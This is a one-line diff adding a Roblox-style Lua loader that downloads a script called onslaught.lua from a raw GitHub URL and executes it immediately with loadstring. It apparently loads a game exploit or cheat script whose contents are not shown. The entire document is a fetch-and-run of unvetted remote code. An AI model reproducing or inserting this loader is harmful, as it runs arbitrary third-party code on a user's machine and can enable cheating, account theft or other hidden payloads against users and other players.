@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gamertappen/easy/main/onslaught.lua",true))()
